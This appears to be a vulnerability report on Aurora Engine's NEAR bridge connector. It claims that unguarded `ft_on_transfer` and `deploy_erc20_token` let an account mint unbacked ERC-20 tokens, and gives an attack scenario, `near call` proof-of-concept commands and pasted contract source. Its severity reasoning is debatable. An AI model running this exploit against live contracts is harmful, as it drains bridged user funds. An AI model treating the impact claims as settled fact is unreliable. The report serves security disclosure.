### Title
Unlimited ERC-20 Mint via Direct `ft_on_transfer` Call Without Real NEP-141 Transfer - (File: `engine/src/contract_methods/connector.rs`)

---

### Summary

The `ft_on_transfer` NEAR entry point in Aurora Engine mints ERC-20 bridge tokens based solely on the `predecessor_account_id` and the caller-supplied `amount`, with no verification that a real NEP-141 transfer to Aurora actually occurred. Because `deploy_erc20_token` also has no access control, any NEAR account can register itself as a NEP-141 and then call `ft_on_transfer` directly to mint an unlimited number of ERC-20 tokens for free, leading to insolvency for the affected token pair.

---

### Finding Description

**Step 1 – Unguarded `deploy_erc20_token`**

The public NEAR method `deploy_erc20_token` performs only a liveness check (`require_running`) and no caller-identity check:

```rust
// engine/src/contract_methods/connector.rs
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I, env: &E, handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;   // only check
        ...
    })
}
```

Any NEAR account can call this to deploy an ERC-20 and register the mapping `nep141_account_id → erc20_address` in the `Nep141Erc20Map` storage.

**Step 2 – Unguarded `ft_on_transfer`**

The public NEAR method `ft_on_transfer` also performs only a liveness check:

```rust
// engine/src/contract_methods/connector.rs
pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I, env: &E, handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;   // only check
        let predecessor_account_id = env.predecessor_account_id();
        ...
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(&predecessor_account_id, &args, ...)
        };
        ...
    })
}
```

**Step 3 – `receive_erc20_tokens` mints without transfer verification**

`receive_erc20_tokens` looks up the ERC-20 address for the `predecessor_account_id` and calls `mint(recipient, amount)` on it:

```rust
// engine/src/engine.rs
pub fn receive_erc20_tokens<P: PromiseHandler>(
    &mut self, token: &AccountId, args: &FtOnTransferArgs, ...
) -> Result<Option<SubmitResult>, ContractError> {
    ...
    let erc20_token = get_erc20_from_nep141(&self.io, token)?;  // lookup only
    let result = self.call(
        &erc20_admin_address,
        &erc20_token,
        Wei::zero(),
        setup_receive_erc20_tokens_input(&recipient, amount),    // mint(recipient, amount)
        u64::MAX, ...
    ).and_then(submit_result_or_err)?;
    ...
}
```

There is no check that the `predecessor_account_id` actually transferred `amount` NEP-141 tokens to Aurora before this call. The function trusts the caller-supplied `amount` unconditionally.

**`get_erc20_from_nep141` returns an error only when the NEP-141 is unregistered:**

```rust
// engine/src/engine.rs
pub fn get_erc20_from_nep141<I: IO>(io: &I, nep141_account_id: &AccountId)
    -> Result<Address, GetErc20FromNep141Error>
{
    let key = bytes_to_key(KeyPrefix::Nep141Erc20Map, nep141_account_id.as_bytes());
    io.read_storage(&key)
        .map(|v| { ... Address::from_array(buf) })
        .ok_or(GetErc20FromNep141Error::Nep141NotFound)
}
```

Once the attacker registers their account via `deploy_erc20_token`, this lookup succeeds and minting proceeds.

---

### Impact Explanation

**Critical – Direct theft of user funds / insolvency.**

Attack scenario:

1. Attacker deploys a NEP-141 token at `evil.near` and attracts legitimate users to bridge it to Aurora (Aurora accumulates a real balance of `evil.near` NEP-141 tokens; users receive ERC-20 tokens backed 1:1).
2. Attacker calls `deploy_erc20_token("evil.near")` — already done by the bridge flow, or done independently since there is no access control.
3. Attacker calls `ft_on_transfer` directly on Aurora with `predecessor_account_id = "evil.near"`, `amount = <large number>`, `msg = <attacker EVM address>`. Aurora mints that many ERC-20 tokens to the attacker's EVM address with no real NEP-141 transfer.
4. Attacker calls `exit_to_near` (the `ExitToNear` precompile) to redeem the fake ERC-20 tokens. Aurora burns the ERC-20 tokens and calls `ft_transfer` on `evil.near`, draining the real NEP-141 balance that legitimate users deposited.
5. Legitimate users' ERC-20 tokens are now unbacked; they cannot exit. Full insolvency for the `evil.near` token pair.

Even without step 4, the attacker can use the unbacked ERC-20 tokens as collateral in any DeFi protocol deployed on Aurora, borrowing real assets against fake collateral.

---

### Likelihood Explanation

**High.** Both entry points (`deploy_erc20_token` and `ft_on_transfer`) are public NEAR methods with no caller restriction. The attack requires only:

- Controlling a NEAR account (trivial).
- Calling two public methods in sequence (trivial).
- Attracting some legitimate bridge volume to the attacker's NEP-141 (realistic for a malicious token operator, or unnecessary if the attacker targets DeFi collateral use).

No privileged access, leaked keys, or oracle manipulation is required.

---

### Recommendation

1. **Add access control to `deploy_erc20_token`**: Restrict registration of new NEP-141↔ERC-20 pairs to the contract owner/admin, or require a proof that the NEP-141 contract exists and is legitimate.

2. **Verify the transfer in `ft_on_transfer`**: Before minting, record the expected incoming amount (e.g., via a pending-transfer nonce written during `ft_transfer_call` on the NEP-141 side) and verify it matches the `amount` argument. Alternatively, reject `ft_on_transfer` calls from accounts that are not registered NEP-141 contracts via an allowlist.

3. **Minimum: reject unregistered callers**: If `get_erc20_from_nep141` returns `Nep141NotFound`, the current code already returns the full amount (correct). Ensure that only accounts registered through a privileged path can ever appear in `Nep141Erc20Map`.

---

### Proof of Concept

```
# On NEAR testnet / localnet

# 1. Attacker controls "evil.near"
# 2. Register evil.near as a NEP-141 in Aurora (no access control)
near call aurora.test.near deploy_erc20_token \
  '{"nep141": "evil.near"}' \
  --accountId attacker.near

# 3. Directly call ft_on_transfer as evil.near (predecessor = evil.near)
#    with an arbitrarily large amount and attacker's EVM address as msg
near call aurora.test.near ft_on_transfer \
  '{"sender_id":"evil.near","amount":"1000000000000000000000","msg":"<attacker_evm_hex>"}' \
  --accountId evil.near

# Result: Aurora mints 1e21 ERC-20 tokens for evil.near to attacker's EVM address
# with zero real NEP-141 transfer. Attacker can now exit via ExitToNear,
# draining any real evil.near NEP-141 tokens Aurora holds from legitimate users.
```

#[named]
pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })

    pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;

        sdk::log!("Mint {amount} ERC-20 tokens for: {}", recipient.encode());

        // Return SubmitResult so that it can be accessed in standalone engine.
        // This is used to help with the indexing of bridge transactions.
        Ok(Some(result))
    }

pub fn get_erc20_from_nep141<I: IO>(
    io: &I,
    nep141_account_id: &AccountId,
) -> Result<Address, GetErc20FromNep141Error> {
    let key = bytes_to_key(KeyPrefix::Nep141Erc20Map, nep141_account_id.as_bytes());
    io.read_storage(&key)
        .map(|v| {
            let mut buf = [0u8; 20];
            v.copy_to_slice(&mut buf);
            Address::from_array(buf)
        })
        .ok_or(GetErc20FromNep141Error::Nep141NotFound)
}
